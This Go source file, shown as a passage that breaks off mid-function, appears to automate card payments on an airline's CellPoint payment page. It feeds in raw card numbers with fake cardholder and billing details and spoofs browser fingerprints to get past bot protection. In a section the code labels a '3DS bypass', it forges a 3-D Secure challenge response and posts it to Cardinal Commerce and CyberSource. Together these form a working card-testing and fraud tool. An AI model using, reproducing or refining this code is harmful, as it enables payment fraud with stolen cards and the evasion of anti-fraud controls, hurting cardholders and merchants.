package main

import (
	"crypto/hmac"
	"crypto/sha512"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"html"
	"io"
	"log"
	"math/rand"
	"net/http"
	stdjar "net/http/cookiejar"
	"net/url"
	"regexp"
	"strconv"
	"strings"
	"time"

	bogjjar "github.com/bogdanfinn/fhttp/cookiejar"
	tls_client "github.com/bogdanfinn/tls-client"
)

// getHPPUserAgent returns the configurable User-Agent used for HPP and payment requests.
func getHPPUserAgent() string {
	if ua := getConfig("hpp_user_agent"); ua != "" {
		return ua
	}
	return "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36"
}

// resolveUA returns override if non-empty, otherwise falls back to getHPPUserAgent.
func resolveUA(override string) string {
	if override != "" {
		return override
	}
	return getHPPUserAgent()
}

// parseHPPForm extracts hidden input fields from HTML → url-encoded postfield.
// The HTML may use single or double quotes for attribute values.
func parseHPPForm(htmlStr string) string {
	// If the HPP response is JSON with a rawHtml field, unwrap it first.
	var hppJSON map[string]interface{}
	if err := json.Unmarshal([]byte(htmlStr), &hppJSON); err == nil {
		if raw, ok := hppJSON["rawHtml"].(string); ok && raw != "" {
			htmlStr = raw
		}
	}

	// Matches a single input tag (non-greedy, stops at >).
	// Note: value can contain JSON with the opposite quote type, so we
	// use alternation: single-quoted captures [^']*, double-quoted captures [^"]*.
	inputRe := regexp.MustCompile(`(?i)<input\b[^>]*?>`)
	typeRe  := regexp.MustCompile(`(?i)\btype\s*=\s*(?:'hidden'|"hidden"|hidden)`)
	nameRe  := regexp.MustCompile(`(?i)\bname\s*=\s*(?:'([^']*)'|"([^"]*)")`)
	valueRe := regexp.MustCompile(`(?i)\bvalue\s*=\s*(?:'([^']*)'|"([^"]*)")`)

	pickGroup := func(m []string) string {
		for _, s := range m[1:] {
			if s != "" {
				return s
			}
		}
		return ""
	}

	vals := url.Values{}
	for _, inp := range inputRe.FindAllString(htmlStr, -1) {
		if !typeRe.MatchString(inp) {
			continue
		}
		nm := nameRe.FindStringSubmatch(inp)
		if nm == nil {
			continue
		}
		name := pickGroup(nm)
		value := ""
		if vm := valueRe.FindStringSubmatch(inp); vm != nil {
			value = pickGroup(vm)
		}
		vals.Add(name, value)
	}
	if len(vals) == 0 {
		return ""
	}
	return vals.Encode()
}

// extractSessionStorage parses sessionStorage.setItem(key, value) calls from HTML.
func extractSessionStorage(htmlStr string) map[string]string {
	re := regexp.MustCompile(`sessionStorage\.setItem\(\s*['"]([^'"]+)['"]\s*,\s*(?:'([^']*)'|"([^"]*)")\s*\)`)
	result := make(map[string]string)
	for _, m := range re.FindAllStringSubmatch(htmlStr, -1) {
		v := m[2]
		if v == "" {
			v = m[3]
		}
		result[m[1]] = v
	}
	return result
}

// signBody returns (HMAC-SHA512 hex, timestamp-ms key) — mirrors Python generateSignature().
func signBody(body string) (sig, key string) {
	key = strconv.FormatInt(time.Now().UnixMilli(), 10)
	mac := hmac.New(sha512.New, []byte(key))
	mac.Write([]byte(body))
	sig = hex.EncodeToString(mac.Sum(nil))
	return
}

// between extracts text between two string delimiters — mirrors Python g().
func between(text, before, after string) string {
	a := strings.SplitN(text, before, 2)
	if len(a) < 2 {
		return ""
	}
	b := strings.SplitN(a[1], after, 2)
	if len(b) < 2 {
		return ""
	}
	return b[0]
}

func cardTypeIDStr(cardNumber string) string {
	switch {
	case strings.HasPrefix(cardNumber, "4"):
		return "8"
	case strings.HasPrefix(cardNumber, "34"), strings.HasPrefix(cardNumber, "37"):
		return "1"
	case strings.HasPrefix(cardNumber, "5"):
		return "7"
	default:
		return "5"
	}
}

func subcodeMessage(code string) string {
	msgs := map[string]string{
		"2010000": "Unknown error",
		"2010101": "The amount is invalid.",
		"2010102": "Card number is invalid.",
		"2010103": "Installment field value is invalid.",
		"2010104": "Invalid order number value",
		"2010105": "Missing mandatory fields or data is not present",
		"2010106": "Invalid MerchantId",
		"2010107": "Invalid TransactionId",
		"2010108": "Invalid transaction date",
		"2010109": "Invalid CVC or CVN",
		"2010110": "Invalid payment type",
		"2010111": "Invalid expiry date",
		"2010112": "Invalid 3DS secure values",
		"2010113": "Invalid card type",
		"2010114": "Invalid request version",
		"2010115": "Return URL is not set.",
		"2010116": "Invalid currency code.",
		"2010117": "Invalid promotion.",
		"2010118": "Invalid token.",
		"2010201": "Invalid access credentials",
		"2010202": "Invalid PIN or OTP",
		"2010203": "Insufficient funds or over credit limit",
		"2010204": "Expired card",
		"2010205": "Unable to authorize",
		"2010206": "Exceeds withdrawal count limit OR authentication requested",
		"2010207": "Do not honor",
		"2010208": "Transaction not permitted to user",
		"2010301": "Internal error / general system error",
		"2010302": "Parse error / invalid Request",
		"2010303": "Service not available.",
		"2010304": "Time out",
		"2010305": "Payment is cancelled / Payment reversed",
		"2010306": "Waiting for upstream response",
		"2010307": "No routing available",
		"2010308": "System DB error",
		"2010309": "Invalid operation / operation rejected",
		"2010310": "Transaction already in progress / duplicate transaction / duplicate order number",
		"2010311": "Endpoint not supported",
		"2010312": "Transaction not permitted to terminal",
		"2010313": "Invalid merchant account / configuration / API permission missing",
		"2010314": "Transaction rejected by issuer / authorization failed / transaction failed",
		"2010315": "EMI not available",
		"2010316": "Void not supported",
		"2010317": "Already captured",
		"2010318": "Retry limit exceeded",
		"2010319": "Invalid capture attempted / capture amount exceeds approved amount",
		"2010320": "Transaction not posted",
		"2010321": "Recurring payment not supported",
		"2010322": "Stored card option is disabled.",
		"2010323": "Request authentication failed.",
		"2010324": "Unable to decrypt request.",
		"2010325": "Transaction ID / EP generation failed",
		"2010326": "Installment payment is disabled.",
		"2010327": "Ticket issue failed",
		"2010328": "Sign-in failed",
		"2010329": "Card type is not allowed.",
		"2010330": "Issuing bank unavailable.",
		"2010331": "Transaction exceeds the approved limit",
		"2010332": "Cannot void as capture or credit is submitted",
		"2010333": "Cannot refund as you requested a credit for a capture that was previously voided.",
		"2010334": "Credit amount exceeds maximum allowed for your merchant account.",
		"2010401": "FRAUD Suspicion / Rejected",
		"2010402": "Address verification failed",
		"2010403": "Card acceptor should contact acquirer / Issuing bank has questions about the request",
		"2010404": "Security violation",
		"2010405": "Card is blocked due to fraud",
		"2010406": "3D secure authentication failed",
		"2010407": "Fraud, stolen or lost card",
		"2010408": "Compliance ERROR",
		"2010409": "Transaction previously declined",
		"2010410": "E-commerce declined",
		"2010411": "Card restricted",
		"2010412": "Card function not supported",
		"2010413": "Physical card error",
		"2010414": "BIN check failed",
		"2010415": "Validation check failed.",
		"2010416": "CVN did not match",
		"2010417": "The customer matched an entry on the processor's negative file.",
		"2010418": "Strong customer authentication (SCA) is required for this transaction.",
		"2010419": "Authorization request was approved by the issuing bank but declined by gateway or processor.",
		"2016000": "3D Verification Failed",
	}
	if m, ok := msgs[code]; ok {
		return m
	}
	return "Unknown error code"
}

func newStdClient() *http.Client {
	j, _ := stdjar.New(nil)
	return &http.Client{Jar: j, Timeout: 30 * time.Second}
}

func newNoRedirectClient() *http.Client {
	j, _ := stdjar.New(nil)
	return &http.Client{
		Jar:     j,
		Timeout: 30 * time.Second,
		CheckRedirect: func(*http.Request, []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}
}

func doJSONPost(client *http.Client, u, userAgent string, extra map[string]string, body string) (int, string, http.Header, error) {
	req, err := http.NewRequest(http.MethodPost, u, strings.NewReader(body))
	if err != nil {
		return 0, "", nil, err
	}
	req.Header.Set("content-type", "application/json")
	req.Header.Set("user-agent", resolveUA(userAgent))
	req.Header.Set("accept", "*/*")
	req.Header.Set("accept-language", "en-US,en;q=0.9")
	for k, v := range extra {
		req.Header.Set(k, v)
	}
	resp, err := client.Do(req)
	if err != nil {
		return 0, "", nil, err
	}
	b, _ := io.ReadAll(resp.Body)
	resp.Body.Close()
	return resp.StatusCode, string(b), resp.Header, nil
}

func doFormPost(client *http.Client, u, userAgent string, extra map[string]string, body string) (int, string, http.Header, error) {
	req, err := http.NewRequest(http.MethodPost, u, strings.NewReader(body))
	if err != nil {
		return 0, "", nil, err
	}
	req.Header.Set("content-type", "application/x-www-form-urlencoded")
	req.Header.Set("user-agent", resolveUA(userAgent))
	req.Header.Set("accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
	req.Header.Set("accept-language", "en-US,en;q=0.9")
	for k, v := range extra {
		req.Header.Set(k, v)
	}
	resp, err := client.Do(req)
	if err != nil {
		return 0, "", nil, err
	}
	b, _ := io.ReadAll(resp.Body)
	resp.Body.Close()
	return resp.StatusCode, string(b), resp.Header, nil
}

func genUUID() string {
	r := rand.New(rand.NewSource(time.Now().UnixNano()))
	b := make([]byte, 16)
	for i := 0; i < 16; i += 8 {
		n := r.Int63()
		for j := 0; j < 8 && i+j < 16; j++ {
			b[i+j] = byte(n >> (j * 8))
		}
	}
	b[6] = (b[6] & 0x0f) | 0x40
	b[8] = (b[8] & 0x3f) | 0x80
	return fmt.Sprintf("%08x-%04x-%04x-%04x-%012x", b[0:4], b[4:6], b[6:8], b[8:10], b[10:16])
}

// processManualPayment runs the full payment flow after Akamai bot challenge.
func processManualPayment(
	tlsClient tls_client.HttpClient,
	jar *bogjjar.Jar,
	xAuthToken, bearerToken, hppContent, hppUserAgent,
	cardNumber, month, year string,
) (bool, string, *ItineraryData, error) {

	monthInt, _ := strconv.Atoi(month)
	monthFmt := fmt.Sprintf("%02d", monthInt)
	yearShort := year
	if len(year) == 4 {
		yearShort = year[2:]
	}

	ua := resolveUA(hppUserAgent)

	// ── A: HPP POST ───────────────────────────────────────────────────────────
	hppStatus, hppHTML, err := makeHPPPost(tlsClient, xAuthToken, bearerToken, hppContent, ua)
	if err != nil {
		return false, "", nil, fmt.Errorf("HPP POST: %w", err)
	}
	switch hppStatus {
	case 403:
		return false, "HPP 403 — Akamai blocked", nil, nil
	case 404:
		return false, "HPP 404 — Booking session expired or tokens invalid", nil, nil
	case 400:
		p := hppHTML
		if len(p) > 500 {
			p = p[:500]
		}
		return false, "HPP 400 — " + p, nil, nil
	}
	if hppStatus != 200 {
		return false, fmt.Sprintf("HPP error (status %d)", hppStatus), nil, nil
	}
	if strings.Contains(hppHTML, "Booking balance due must be greater than 0") {
		return false, "Booking balance due must be greater than 0.", nil, nil
	}

	// ── B: Parse HPP HTML → urlencoded postfield ──────────────────────────────
	postfield := parseHPPForm(hppHTML)
	if postfield == "" {
		p := hppHTML
		if len(p) > 500 {
			p = p[:500]
		}
		return false, "Failed to parse HPP form. Preview: " + p, nil, nil
	}
	// ── C: POST to web.php ───────────────────────────────────────────────────
	stdClient := newStdClient()
	webCode, webBody, _, err := doFormPost(stdClient, "https://pop.cellpointdigital.net/views/web.php", ua,
		map[string]string{
			"cache-control": "max-age=0",
			"origin":        baseURL,
			"referer":       baseURL + "/",
			"upgrade-insecure-requests": "1",
		},
		postfield,
	)
	if err != nil {
		return false, "", nil, fmt.Errorf("web.php: %w", err)
	}
	if webCode != 200 {
		return false, fmt.Sprintf("web.php failed (%d)", webCode), nil, nil
	}

	// ── D: Extract sessionStorage from web.php ────────────────────────────────
	v := extractSessionStorage(webBody)
	if len(v) == 0 {
		p := webBody
		if len(p) > 500 {
			p = p[:500]
		}
		return false, "Failed to extract session data from web.php. Preview: " + p, nil, nil
	}
	// helpers
	strOrNull := func(key string) interface{} {
		val := v[key]
		if val == "" {
			return nil
		}
		return val
	}
	operatorInt := func() int {
		if op := v["operator"]; op != "" {
			if n, e := strconv.Atoi(op); e == nil {
				return n
			}
		}
		return 0
	}

	pfParsed, _ := url.ParseQuery(postfield)
	txntype := pfParsed.Get("txntype")

	// ── E: Initialize ─────────────────────────────────────────────────────────
	initMap := map[string]interface{}{
		"country":          v["country"],
		"mobilecountry":    v["mobilecountry"],
		"clientid":         v["clientid"],
		"account":          v["account"],
		"language":         "en",
		"orderid":          v["orderid"],
		"mobile":           v["mobile"],
		"operator":         operatorInt(),
		"email":            v["email"],
		"name":             "Test Name",
		"customerref":      v["customerref"],
		"accounts":         "",
		"markup":           "HTML5",
		"amount":           v["amount"],
		"fees":             v["fees"],
		"accepturl":        v["accepturl"],
		"cancelurl":        v["cancelurl"],
		"callbackurl":      v["callbackurl"],
		"orderdata":        v["orderdata"],
		"sessionid":        "",
		"currency":         v["currency-code"],
		"authtoken":        v["authtoken"],
		"deviceid":         "",
		"hmac":             v["hmac"],
		"additionaldata":   v["additionaldata"],
		"initToken":        v["inittoken"],
		"iframe":           false,
		"nonce":            v["nonce"],
		"txntype":          txntype,
		"locale":           "",
		"hppAppVersion":    "2.0.0",
		"logourl":          "https://storage.googleapis.com/bkt-cp-prod-ehpp2/10077/logo.png",
		"cssurl":           "https://storage.googleapis.com/bkt-cp-prod-ehpp2/10077",
		"assetsurl":        "https://storage.googleapis.com/bkt-cp-prod-ehpp2/10077",
		"profileid":        v["profileid"],
		"gtmdata":          strOrNull("gtm-data"),
		"gtmid":            v["gtm-id"],
		"responsecontenttype": "1",
		"paymentgroupcode": strOrNull("paymentgroupcode"),
		"authversion":      strOrNull("authversion"),
		"jsonconvertedrequestdata": v["jsonconvertedrequestdata"],
		"themeversion":     strOrNull("themeversion"),
		"minifyversion":    strOrNull("minifyversion"),
		"timetoken":        v["timetoken"],
		"mitdata":          strOrNull("mitdata"),
		"producttype":      strOrNull("producttype"),
		"flow":             strOrNull("flow"),
		"mesbhost":         "5j.velocity.cellpointmobile.net",
		"surcharge":        strOrNull("surcharge"),
	}
	initBodyBytes, _ := json.Marshal(initMap)
	initBodyStr := string(initBodyBytes)
	initSig, initKey := signBody(initBodyStr)
	tokenHash := v["encryptedAuthHash"]

	var initJSON map[string]interface{}
	for range 30 {
		code, body, _, err2 := doJSONPost(stdClient, "https://pop.cellpointdigital.net/api/initialize",
			ua,
			map[string]string{
				"signature":        initSig,
				"token":            v["inittoken"],
				"key":              initKey,
				"nonce":            v["nonce"],
				"x-encrypted-auth": tokenHash,
				"origin":           "https://pop.cellpointdigital.net",
				"referer":          "https://pop.cellpointdigital.net/",
				"priority":         "u=1, i",
			},
			initBodyStr,
		)
		if err2 != nil {
			return false, "", nil, fmt.Errorf("initialize: %w", err2)
		}
		if code == 200 && len(body) > 0 {
			if e := json.Unmarshal([]byte(body), &initJSON); e != nil {
				return false, "", nil, fmt.Errorf("initialize JSON: %w", e)
			}
			break
		} else if code == 200 {
			continue
		}
		break
	}
	if initJSON == nil {
		return false, "Initialize was not successful.", nil, nil
	}

	transactionID := ""
	if tx, ok := initJSON["transaction"].(map[string]interface{}); ok {
		switch id := tx["id"].(type) {
		case float64:
			transactionID = strconv.FormatFloat(id, 'f', 0, 64)
		case string:
			transactionID = id
		}
	}
	initCurrency := "PHP"
	if cur, ok := initJSON["currency"].(string); ok && cur != "" {
		initCurrency = cur
	}
	log.Printf("transactionID=%s initCurrency=%s", transactionID, initCurrency)

	// ── F: FX Lookup ──────────────────────────────────────────────────────────
	decktoken := base64.StdEncoding.EncodeToString([]byte(cardNumber))
	ctID := cardTypeIDStr(cardNumber)
	opForFX := v["operator"]
	if opForFX == "" {
		opForFX = "64000"
	}

	fxMap := map[string]interface{}{
		"country":       v["country"],
		"clientid":      v["clientid"],
		"mobilecountry": v["mobilecountry"],
		"account":       v["account"],
		"orderid":       v["orderid"],
		"mobile":        v["mobile"],
		"operator":      opForFX,
		"email":         v["email"],
		"language":      "en",
		"customerref":   v["customerref"],
		"accounts":      "",
		"markup":        "HTML5",
		"amount":        v["amount"],
		"transaction":   transactionID,
		"currency":      initCurrency,
		"decktoken":     decktoken,
		"cardtypeid":    ctID,
	}
	fxBodyBytes, _ := json.Marshal(fxMap)
	fxCode, fxBodyStr, _, err := doJSONPost(stdClient, "https://pop.cellpointdigital.net/api/fxlookup",
		ua,
		map[string]string{
			"origin":  "https://pop.cellpointdigital.net",
			"referer": "https://pop.cellpointdigital.net/",
			"priority": "u=1, i",
		},
		string(fxBodyBytes),
	)
	if err != nil || fxCode != 200 {
		return false, "fxlookup was not successful.", nil, nil
	}

	var fxJSON map[string]interface{}
	json.Unmarshal([]byte(fxBodyStr), &fxJSON)

	// Parse FX offer
	var cfxID interface{}
	var fxrate, fxhmac, displayMargin, exchangeAmountStr, saleAmountStr string
	var exchangeCurrNum interface{}
	var saleCurrNum interface{}
	fxStatusCode := "115"
	additionalParams := []map[string]interface{}{}

	if o, ok := fxJSON["Offer"].(map[string]interface{}); ok {
		cfxID = o["foreign_exchange_offer_id"]
		if pcoMap, ok := o["payment_currency_offers"].(map[string]interface{}); ok {
			if pco, ok := pcoMap["payment_currency_offer"].(map[string]interface{}); ok {
				fxrate = fmt.Sprint(pco["offered_exchange_rate"])
				fxhmac = fmt.Sprint(pco["validation_hmac"])
				displayMargin = fmt.Sprint(pco["display_margin_percentage"])
				if displayMargin == "%!v(MISSING)" || displayMargin == "<nil>" {
					displayMargin = "6"
				}
				if ea, ok := pco["exchange_amount"].(map[string]interface{}); ok {
					exchangeAmountStr = fmt.Sprint(ea["price"])
				}
				if sa, ok := pco["sale_amount"].(map[string]interface{}); ok {
					saleAmountStr = fmt.Sprint(sa["price"])
				}
				if ec, ok := pco["exchange_currency"].(map[string]interface{}); ok {
					exchangeCurrNum = ec["iso_numeric_code"]
				}
				if sc, ok := pco["sale_currency"].(map[string]interface{}); ok {
					saleCurrNum = sc["iso_numeric_code"]
				}
			}
		}
	}
	if st, ok := fxJSON["status"].(map[string]interface{}); ok {
		if c, ok := st["code"].(string); ok {
			fxStatusCode = c
		}
	}

	// cfxID nil check: empty string or nil both mean no FX offer
	cfxIDStr := fmt.Sprint(cfxID)
	hasFX := cfxID != nil && cfxIDStr != "" && cfxIDStr != "<nil>"

	if hasFX {
		additionalParams = append(additionalParams,
			map[string]interface{}{"name": "margin_percentage", "text": displayMargin},
			map[string]interface{}{"name": "display_margin_percentage", "text": displayMargin},
		)
	} else {
		cfxID = nil
		additionalParams = append(additionalParams,
			map[string]interface{}{"name": "cfx_status_code", "text": fxStatusCode},
		)
	}
	additionalParams = append(additionalParams,
		map[string]interface{}{"name": "BrowserScreenHeight", "text": 826},
		map[string]interface{}{"name": "BrowserScreenWidth", "text": 563},
		map[string]interface{}{"name": "BrowserLanguage", "text": "en-US"},
		map[string]interface{}{"name": "BrowserJavaEnabled", "text": "false"},
		map[string]interface{}{"name": "BrowserJavascriptEnabled", "text": true},
		map[string]interface{}{"name": "BrowserColorDepth", "text": 24},
		map[string]interface{}{"name": "BrowserTimeZoneOffset", "text": -480},
		map[string]interface{}{"name": "UserAgent", "text": ua},
		map[string]interface{}{"name": "BrowserScreenType", "text": "desktop"},
		map[string]interface{}{"name": "BrowserOrientation", "text": "portrait"},
	)

	// ── G: Build authorize dict ───────────────────────────────────────────────
	decktokenbinrange := base64.StdEncoding.EncodeToString([]byte(cardNumber[:min(11, len(cardNumber))]))
	termination := base64.StdEncoding.EncodeToString([]byte(monthFmt + "/" + yearShort))
	ctIDInt, _ := strconv.Atoi(ctID)
	toInt := func(s string) int {
		n, _ := strconv.Atoi(s)
		return n
	}
	countryInt := toInt(v["country"])
	mobileCountryInt := toInt(v["mobilecountry"])

	authDict := map[string]interface{}{
		"cardname":               "Test User",
		"decktoken":              decktoken,
		"decktokenbinrange":      decktokenbinrange,
		"termination":            termination,
		"validfrom":              "",
		"cardtypeid":             ctIDInt,
		"paymenttype":            false,
		"token":                  "",
		"network":                "",
		"storecard":              "false",
		"accountconfirmpassword": "",
		"accountpassword":        "",
		"accouontname":           "",
		"typeid":                 "10091",
		"mitdata":                nil,
		"additionaldata":         map[string]interface{}{"param": additionalParams},
		"paymentgroupcode":       nil,
		"country":                countryInt,
		"clientid":               v["clientid"],
		"mobilecountry":          mobileCountryInt,
		"account":                v["account"],
		"mobile":                 v["mobile"],
		"operator":               operatorInt(),
		"email":                  v["email"],
		"language":               "en",
		"customerref":            v["customerref"],
		"markup":                 "HTML5",
		"profileid":              v["profileid"],
		"transaction":            transactionID,
		"refundProtectionNode":   nil,
		"authtoken":              v["authtoken"],
		"billingaddress": map[string]interface{}{
			"fullname":         "Test User",
			"email":            "",
			"address1":         "123 Rizal Avenue",
			"address2":         "",
			"street":           "123 Rizal Avenue",
			"countryid":        "640",
			"city":             "Manila",
			"state":            "Metro Manila",
			"postalcode":       "1000",
			"mobilecontrycode": 640,
			"mobilenumber":     v["mobile"],
			"cardholderemail":  v["email"],
			"firstName":        "Test",
			"lastName":         "User",
			"operatorid":       opForFX,
		},
		"cardid":        "",
		"checkouturl":   "",
		"euaid":         "-1",
		"mvault":        "false",
		"verifier":      "",
		"externalCall":  "true",
		"hppAppVersion": "2.0.0",
	}

	if hasFX {
		isoNum := 608
		switch n := exchangeCurrNum.(type) {
		case float64:
			isoNum = int(n)
		case string:
			isoNum, _ = strconv.Atoi(n)
		}
		authDict["fxservicetypeid"] = "11"
		authDict["amount"] = exchangeAmountStr
		authDict["hmac"] = fxhmac
		authDict["fxrate"] = fxrate
		authDict["currency"] = strconv.Itoa(isoNum)
		authDict["saleamount"] = saleAmountStr
		// salecurrencyid: parse string or float
		saleCurrInt := 608
		switch n := saleCurrNum.(type) {
		case float64:
			saleCurrInt = int(n)
		case string:
			saleCurrInt, _ = strconv.Atoi(n)
		}
		authDict["salecurrencyid"] = strconv.Itoa(saleCurrInt)
		authDict["cfxid"] = cfxID
	} else {
		authDict["amount"] = v["amount"]
		authDict["hmac"] = v["hmac"]
		authDict["currency"] = toInt(v["currency-code"])
	}

	// First authorize (device data collection step)
	auth1Bytes, _ := json.Marshal(authDict)
	auth1Str := string(auth1Bytes)
	auth1Sig, auth1Key := signBody(auth1Str)
	auth1Code, _, _, _ := doJSONPost(stdClient, "https://pop.cellpointdigital.net/api/authorize",
		ua,
		map[string]string{
			"signature": auth1Sig,
			"key":       auth1Key,
			"origin":    "https://pop.cellpointdigital.net",
			"referer":   "https://pop.cellpointdigital.net/",
			"priority":  "u=1, i",
		},
		auth1Str,
	)
	if auth1Code != 200 {
		return false, "Authorize request failed. [Regenerate Postfield.]", nil, nil
	}

	// Second authorize (actual auth with device data)
	authDict2 := make(map[string]interface{})
	for k, val := range authDict {
		authDict2[k] = val
	}
	authDict2["deviceId"] = genUUID()
	authDict2["collectionTime"] = rand.Intn(9999)
	authDict2["expired"] = "false"
	authDict2["status"] = "true"
	authDict2["message"] = "profile.completed"

	auth2Bytes, _ := json.Marshal(authDict2)
	auth2Str := string(auth2Bytes)
	auth2Sig, auth2Key := signBody(auth2Str)
	_, auth2Body, _, _ := doJSONPost(stdClient, "https://pop.cellpointdigital.net/api/authorize",
		ua,
		map[string]string{
			"signature": auth2Sig,
			"key":       auth2Key,
			"origin":    "https://pop.cellpointdigital.net",
			"referer":   "https://pop.cellpointdigital.net/",
			"priority":  "u=1, i",
		},
		auth2Str,
	)
	var authJSON map[string]interface{}
	if e := json.Unmarshal([]byte(auth2Body), &authJSON); e != nil {
		return false, "", nil, fmt.Errorf("authorize2 JSON: %w", e)
	}
	authorizeCode := fmt.Sprint(authJSON["Code"])
	log.Printf("authorizeCode=%s", authorizeCode)

	switch authorizeCode {
	case "2005":
		// ── 3DS bypass ────────────────────────────────────────────────────────
		stepupRaw, _ := authJSON["body"].(string)
		decoded := html.UnescapeString(stepupRaw)

		actionRe := regexp.MustCompile(`action='([^']+)'`)
		jwtRe := regexp.MustCompile(`value='(eyJ[^']+)'`)
		actionM := actionRe.FindStringSubmatch(decoded)
		jwtM := jwtRe.FindStringSubmatch(decoded)
		if actionM == nil || jwtM == nil {
			return false, "Failed to parse 3DS data", nil, nil
		}
		stepupURL := actionM[1]
		stepupJWT := jwtM[1]

		// POST JWT to stepup URL
		_, cruiseHTML, _, err := doFormPost(stdClient, stepupURL,
			ua,
			map[string]string{
				"origin":                    "https://pop.cellpointdigital.net",
				"referer":                   "https://pop.cellpointdigital.net/",
				"cache-control":             "max-age=0",
				"upgrade-insecure-requests": "1",
				"priority":                  "u=0, i",
			},
			"JWT="+url.QueryEscape(stepupJWT),
		)
		if err != nil {
			return false, "", nil, fmt.Errorf("3DS stepup: %w", err)
		}

		payloadRe := regexp.MustCompile(`name="payload" value="([^"]+)"`)
		mcsIdRe := regexp.MustCompile(`name="mcsId" value="([^"]+)"`)
		McsIdRe := regexp.MustCompile(`name="McsId" id="redirect-mcsId" value="([^"]+)"`)

		payloadM := payloadRe.FindStringSubmatch(cruiseHTML)
		mcsIdM := mcsIdRe.FindStringSubmatch(cruiseHTML)
		McsIdM := McsIdRe.FindStringSubmatch(cruiseHTML)

		if payloadM == nil || mcsIdM == nil {
			return false, "Failed to parse 3DS cruise data", nil, nil
		}
		jwtPayload := payloadM[1]
		mcsID := mcsIdM[1]
		McsID := ""
		if McsIdM != nil {
			McsID = McsIdM[1]
		}

		// Decode JWT payload → build CRes
		padded := jwtPayload
		if pad := 4 - len(padded)%4; pad != 4 {
			padded += strings.Repeat("=", pad)
		}
		decodedPayloadBytes, err := base64.StdEncoding.DecodeString(padded)
		if err != nil {
			// try URL encoding
			decodedPayloadBytes, err = base64.URLEncoding.DecodeString(padded)
			if err != nil {
				return false, "Failed to decode 3DS JWT payload", nil, nil
			}
		}
		var jwtPayloadJSON map[string]interface{}
		if e := json.Unmarshal(decodedPayloadBytes, &jwtPayloadJSON); e != nil {
			return false, "", nil, fmt.Errorf("3DS JWT decode: %w", e)
		}
		cresJSON, _ := json.Marshal(map[string]interface{}{
			"threeDSServerTransID":     jwtPayloadJSON["threeDSServerTransID"],
			"acsTransID":               jwtPayloadJSON["acsTransID"],
			"challengeCompletionInd":   "Y",
			"messageType":              "CRes",
			"messageVersion":           "2.2.0",
			"transStatus":              "N",
		})
		cresEncoded := base64.StdEncoding.EncodeToString(cresJSON)

		// POST CRes to Cardinal CCA
		_, _, _, err = doFormPost(stdClient, "https://centinelapi.cardinalcommerce.com/V1/TermURL/2.0/CCA",
			ua,
			map[string]string{
				"origin":                    "https://authentication.cardinalcommerce.com",
				"referer":                   "https://authentication.cardinalcommerce.com/",
				"cache-control":             "max-age=0",
				"upgrade-insecure-requests": "1",
				"priority":                  "u=0, i",
			},
			"cres="+url.QueryEscape(cresEncoded)+"&threeDSSessionData="+url.QueryEscape(mcsID),
		)
		if err != nil {
			return false, "", nil, fmt.Errorf("cardinal CCA: %w", err)
		}

		// POST to Cardinal TermRedirection
		_, redirectHTML, _, err := doFormPost(stdClient, "https://centinelapi.cardinalcommerce.com/V1/Cruise/TermRedirection",
			ua,
			map[string]string{
				"origin":                    "https://centinelapi.cardinalcommerce.com",
				"referer":                   "https://centinelapi.cardinalcommerce.com/V2/Cruise/StepUp",
				"cache-control":             "max-age=0",
				"upgrade-insecure-requests": "1",
				"priority":                  "u=0, i",
			},
			"McsId="+url.QueryEscape(McsID)+"&CardinalJWT=&Error=",
		)
		if err != nil {
			return false, "", nil, fmt.Errorf("cardinal TermRedirection: %w", err)
		}

		txIDRe := regexp.MustCompile(`name="TransactionId" value="([^"]+)"`)
		txIDM := txIDRe.FindStringSubmatch(redirectHTML)
		if txIDM == nil {
			return false, "Merchant's response was not captured. [Retry running the script again.]", nil, nil
		}
		txIDVal := txIDM[1]

		// POST to CyberSource (no-redirect — need Location header)
		noRedir := newNoRedirectClient()
		cyberReq, _ := http.NewRequest(http.MethodPost,
			"https://5j.velocity.cellpointmobile.net/mpi/cybersource/threed-redirect",
			strings.NewReader("TransactionId="+url.QueryEscape(txIDVal)+"&Response=&MD=null"),
		)
		cyberReq.Header.Set("content-type", "application/x-www-form-urlencoded")
		cyberReq.Header.Set("user-agent", ua)
		cyberReq.Header.Set("accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7")
		cyberReq.Header.Set("accept-language", "en-US,en;q=0.9")
		cyberReq.Header.Set("origin", "https://centinelapi.cardinalcommerce.com")
		cyberReq.Header.Set("referer", "https://centinelapi.cardinalcommerce.com/")
		cyberReq.Header.Set("cache-control", "max-age=0")
		cyberReq.Header.Set("upgrade-insecure-requests", "1")
		cyberReq.Header.Set("priority", "u=0, i")
		cyberResp, err := noRedir.Do(cyberReq)
		if err != nil {
			return false, "", nil, fmt.Errorf("cybersource redirect: %w", err)
		}
		io.ReadAll(cyberResp.Body)
		cyberResp.Body.Close()
		location := cyberResp.Header.Get("Location")
		if location == "" {
			return false, "Merchant's response was not captured. [Retry running the script again.]", nil, nil
		}

		parsedLoc, _ := url.Parse(location)
		qp := parsedLoc.Query()
		locCode := qp.Get("code")
		locSubCode := qp.Get("sub_code")
		// SUCCESS: locCode != "2000" AND locSubCode != "2000101" (per payment requirements)
		if locCode == "2000" && locSubCode == "2000101" {
			return false, fmt.Sprintf("Response: %s - %s [Declined]", locCode, subcodeMessage(locSubCode)), nil, nil
		}

		// Payment authorized - proceed to paymentcomplete
		var securedData map[string]interface{}
		if sd, ok := initJSON["secured_data"].(map[string]interface{}); ok {
			securedData = sd
		}

		pcDict := map[string]interface{}{
			"transactionId":    transactionID,
			"clientId":         "10077",
			"pollingTimeout":   "30",
			"minPollingInterval": "1",
			"maxPollingInterval": "10",
			"secure":           "false",
			"token":            v["timetoken"],
			"sessiontime":      "13",
		}
		for k, val := range securedData {
			pcDict[k] = val
		}
		pcBytes, _ := json.Marshal(pcDict)
		_, pcBody, _, _ := doJSONPost(stdClient, "https://pop.cellpointdigital.net/api/paymentcomplete",
			ua,
			map[string]string{
				"referer": location,
				"origin":  "https://pop.cellpointdigital.net",
			},
			string(pcBytes),
		)
		var pcJSON map[string]interface{}
		if e := json.Unmarshal([]byte(pcBody), &pcJSON); e != nil {
			return false, "", nil, fmt.Errorf("paymentcomplete JSON: %w", e)
		}

		fraudDesc := fmt.Sprint(pcJSON["fraud_status_desc"])
